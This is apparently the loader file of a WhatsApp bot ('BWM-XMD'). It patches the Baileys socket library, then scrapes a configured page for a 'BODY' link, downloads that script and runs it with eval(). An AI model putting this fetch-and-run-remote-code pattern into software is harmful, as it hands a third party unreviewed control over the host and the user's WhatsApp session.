//  [BWM-XMD QUANTUM EDITION]
//  >> Version: 8.3.5-quantum.7
const axios   = require("axios");
const cheerio = require("cheerio");
const adams   = require("./config");

// ── 1. Wrap makeWASocket so we can patch every new socket ────────────────
const baileys = require("@whiskeysockets/baileys");
const originalMake = baileys.default || baileys.makeWASocket || baileys;

function makePatchedSocket(...args) {
  const sock = originalMake(...args);

  // ── compatibility shim: add legacy downloadAndSaveMediaMessage ──
  const fs = require("fs");
  const { downloadMediaMessage } = require("@whiskeysockets/baileys");

  sock.downloadAndSaveMediaMessage = async function (
    msg,
    type = "buffer",
    filePath = "./tmp.bin"
  ) {
    const buffer = await downloadMediaMessage(
      msg,
      "buffer",
      {},
      { logger: sock.logger, reuploadRequest: sock.updateMediaMessage }
    );

    if (type === "buffer") return buffer;
    fs.writeFileSync(filePath, buffer);
    return filePath;
  };
  // ────────────────────────────────────────────────────────────────

  return sock;
}

// Replace the export the remote script will `require`
baileys.default = makePatchedSocket;
baileys.makeWASocket = makePatchedSocket;

// ── 2. Fetch and run the remote BODY script ──────────────────────────────
async function fetchBODYUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const targetUrl = $('a:contains("BODY")').attr("href");
    if (!targetUrl) throw new Error("💔 BODY link not found.");

    console.log("❤️  BODY loaded successfully ✅");

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);                 // remote code runs here
  } catch (err) {
    console.error("❌ Startup Error:", err.message);
  }
}

fetchBODYUrl();